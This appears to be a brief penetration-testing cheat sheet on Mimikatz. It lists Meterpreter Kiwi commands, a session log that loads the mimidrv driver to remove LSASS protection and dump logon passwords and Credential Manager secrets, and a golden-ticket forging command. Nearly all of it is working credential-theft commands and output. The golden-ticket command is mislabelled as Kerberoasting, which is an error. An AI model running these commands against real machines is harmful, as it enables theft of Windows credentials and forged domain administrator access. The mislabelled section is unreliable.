# Mimikatz

// Kiwi - initialization from Meterpreter
```  
getsystem
load kiwi
meterpreter > lsa_dump_sam
```

// Kiwi - kiwi_cmd  
```
kiwi_cmd "sekurlsa::logonPasswords full"
```

// Mimikatz  
```
PS C:\tools\Mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 828 -> 00/00 [0-0-0]

mimikatz # sekurlsa::logonpasswords
...
mimikatz # sekurlsa::credman
...
```

// Kerberoasting
```
kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt:<ticket> /id:500 
```  

